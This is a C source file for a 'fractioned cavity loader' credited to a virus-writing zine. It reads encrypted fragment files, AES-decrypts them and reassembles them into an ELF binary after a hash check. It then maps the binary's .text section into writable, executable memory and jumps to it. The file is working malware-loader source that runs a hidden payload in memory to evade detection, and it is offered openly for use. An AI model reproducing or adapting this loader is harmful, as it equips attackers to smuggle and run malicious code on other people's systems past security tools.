/**
 * loader.c
 * This code is based on smelly_vx fractioned cavity loader published in
 * vxug vol 1 zine.
 *
 * This file takes a directory of fractioned files from breaker.c, dencrypts
 * verifies and maps them to executable memory and then executes the file.
 *
 * The Encryption/Decryption used here is the sample code found:
 * https://github.com/saju/misc/blob/master/misc/openssl_aes.c
 *
 * Travis M. <trav@hexproof.sh>
 * Website: hexproof.sh
 *
**/
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <errno.h>
#include <openssl/evp.h>
#include <elf.h>

#include "cavity.h"

int
aes_init (unsigned char *key_data, int key_data_len, unsigned char *salt,
	  EVP_CIPHER_CTX * d_ctx);

unsigned char *aes_decrypt_frac (EVP_CIPHER_CTX * e,
				 unsigned char *ciphertext, int *len);



int execute_loaded_fractions (unsigned char *fractions, int fraction_len);

int
compare_fractions (const void *a, const void *b)
{
  return ((FractionInfo *) a)->position - ((FractionInfo *) b)->position;
}

int exit_clean ();

void
process_files (const char *directory)
{
  DIR *dir;
  struct dirent *entry;
  EVP_MD_CTX *md_ctx;
  const EVP_MD *md;
  unsigned char calculated_hash[EVP_MAX_MD_SIZE];
  unsigned int md_len;
  unsigned char original_hash[EVP_MAX_MD_SIZE];
  int hash_set = 0;
  FractionInfo fractions[MAX_FRACTIONS];
  int fraction_count = 0;
  int hash_len = 0;
  unsigned char *ex_frac_buffer = NULL;
  size_t ex_frac_buffer_size = 0;
  size_t curr_ex_frac_buffer_size = 0;

  int text_section_offset = 0;
  int text_section_length = 0;

  dir = opendir (directory);
  if (dir == NULL)
    {
      perror ("Invalid directory");
      exit (1);
    }

  // First, read all fraction files and store their information
  while ((entry = readdir (dir)) != NULL)
    {
      if (entry->d_type == DT_REG)
	{
	  char path[1024];
	  snprintf (path, sizeof (path), "%s/%s", directory, entry->d_name);

	  FILE *frac_file = fopen (path, "rb");
	  if (frac_file == NULL)
	    {
	      perror ("Error opening fraction file");
	      continue;
	    }

	  FRACT_HEADER fhdr;
	  if (fread (&fhdr, sizeof (FRACT_HEADER), 1, frac_file) != 1)
	    {
	      perror ("Error reading fraction header");
	      fclose (frac_file);
	      continue;
	    }

	  if (fhdr.magic != 0x69)
	    {
	      printf ("Not a fractioned file: %s\n", path);
	      fclose (frac_file);
	      continue;
	    }

	  strcpy (fractions[fraction_count].filename, path);
	  fractions[fraction_count].position = fhdr.position;
	  fraction_count++;

	  fclose (frac_file);
	}
    }

  // Sort fractions by position
  qsort (fractions, fraction_count, sizeof (FractionInfo), compare_fractions);

  md = EVP_sha256 ();
  md_ctx = EVP_MD_CTX_new ();
  EVP_DigestInit_ex (md_ctx, md, NULL);
  unsigned int salt[8];

  for (int i = 0; i < fraction_count; i++)
    {
      EVP_CIPHER_CTX *de = EVP_CIPHER_CTX_new ();

      FILE *frac_file = fopen (fractions[i].filename, "rb");
      if (frac_file == NULL)
	{
	  perror ("Error opening fraction file");
	  continue;
	}

      FRACT_HEADER fhdr = { 0 };
      if (fread (&fhdr, sizeof (FRACT_HEADER), 1, frac_file) != 1)
	{
	  perror ("Error reading fraction header");
	  fclose (frac_file);
	  continue;
	}

      if (fhdr.position == 0)
	{
	  memcpy (original_hash, fhdr.hash, fhdr.hash_len);
	  hash_len = fhdr.hash_len;

	  memcpy (salt, original_hash, 4);
	  memcpy (salt + 4, original_hash + fhdr.hash_len - 4, 4);
	  hash_set = 1;
	}

      aes_init (original_hash, hash_len, (unsigned char *) &salt, de);

      unsigned char frac_buffer[fhdr.fraction_len];
      bzero (frac_buffer, fhdr.fraction_len);
      size_t bytes_read =
	fread (frac_buffer, 1, fhdr.fraction_len, frac_file);
      if (bytes_read <= 0)
	{
	  perror ("Error reading fraction data");
	  fclose (frac_file);
	  continue;
	}

      unsigned char *de_frac_buffer;
      int len = (int) bytes_read;
      de_frac_buffer = aes_decrypt_frac (de, frac_buffer, &len);

      if (ex_frac_buffer == NULL)
	{
	  ex_frac_buffer = malloc (len);
	  ex_frac_buffer_size = len;
	}
      else if (curr_ex_frac_buffer_size + len > ex_frac_buffer_size)
	{
	  ex_frac_buffer_size += len;
	  ex_frac_buffer = realloc (ex_frac_buffer, ex_frac_buffer_size);
	}

      memcpy (ex_frac_buffer + curr_ex_frac_buffer_size, de_frac_buffer, len);
      curr_ex_frac_buffer_size += len;


      EVP_DigestUpdate (md_ctx, de_frac_buffer, len);
      EVP_CIPHER_CTX_free (de);
      fclose (frac_file);
    }

  closedir (dir);

  EVP_DigestFinal_ex (md_ctx, calculated_hash, &md_len);

  Elf64_Ehdr ehdr;
  Elf64_Shdr *shdr = NULL;

  memcpy (&ehdr, ex_frac_buffer, sizeof (ehdr));
  if ((strncmp ((char *) ehdr.e_ident, ELFMAG, 4) != 0)
      || ehdr.e_ident[EI_CLASS] != ELFCLASS64)
    {
      printf ("Assembled fraction is not valid 64-Bit ELF data\n");
      exit (1);
    }

  size_t shdr_size = ehdr.e_shnum * sizeof (Elf64_Shdr);
  shdr = (Elf64_Shdr *) malloc (shdr_size);
  memcpy (shdr, ex_frac_buffer + ehdr.e_shoff, shdr_size);

  for (int sections = 0; sections < ehdr.e_shnum; sections++)
    {
      size_t offset =
	shdr[ehdr.e_shstrndx].sh_offset + shdr[sections].sh_name;
      if (memcmp (ex_frac_buffer + offset, ".text", 5) == 0)
	{
	  text_section_offset = shdr[sections].sh_offset;
	  text_section_length = shdr[sections].sh_size;
	  break;
	}
    }

  if (!hash_set)
    {
      printf ("Error: No fractions found or unable to read original hash.\n");
      EVP_MD_CTX_free (md_ctx);
      exit (1);
    }

  if (memcmp (original_hash, calculated_hash, md_len) == 0)
    {
      printf
	("Hash verification successful. File reassembled correctly. Executing in memory.\n");

      unsigned char *text_section = ex_frac_buffer + text_section_offset;
      size_t text_section_size = text_section_length;
      if (execute_loaded_fractions (text_section, text_section_size) == 0)
	{
	  printf ("Successfully executed in memory.\n");
	}
    }
  else
    {
      printf
	("Hash verification failed. Reassembled file may be corrupted.\n");
      EVP_MD_CTX_free (md_ctx);
      exit (1);
    }

  EVP_MD_CTX_free (md_ctx);
}

int
aes_init (unsigned char *key_data, int key_data_len, unsigned char *salt,
	  EVP_CIPHER_CTX * d_ctx)
{
  int nrounds = 5;
  unsigned char key[32], iv[32];

  EVP_BytesToKey (EVP_aes_256_cbc (), EVP_sha1 (), salt, key_data,
		  key_data_len, nrounds, key, iv);

  EVP_CIPHER_CTX_init (d_ctx);
  EVP_DecryptInit_ex (d_ctx, EVP_aes_256_cbc (), NULL, key, iv);

  return 0;
}

unsigned char *
aes_decrypt_frac (EVP_CIPHER_CTX * e, unsigned char *ciphertext, int *len)
{
  int p_len = *len, f_len = 0;
  unsigned char *plaintext = malloc (p_len);

  EVP_DecryptUpdate (e, plaintext, &p_len, ciphertext, *len);
  EVP_DecryptFinal_ex (e, plaintext + p_len, &f_len);

  *len = p_len + f_len;
  return plaintext;
}

int
execute_loaded_fractions (unsigned char *fractions, int fraction_len)
{
  unsigned char *fractions_ex;

  fractions_ex =
    (unsigned char *) mmap (NULL, fraction_len,
			    PROT_EXEC | PROT_READ | PROT_WRITE,
			    MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
  if (fractions_ex == MAP_FAILED)
    {
      return -1;
    }

  memcpy (fractions_ex, fractions, fraction_len);

  (*(void (*)()) fractions_ex) ();

  return 0;

}

int
exit_clean ()
{
  return 0;
}

int
main (int argc, char *argv[])
{

  if (argc > 1)
    {
      process_files (argv[1]);
    }
  return 0;
}
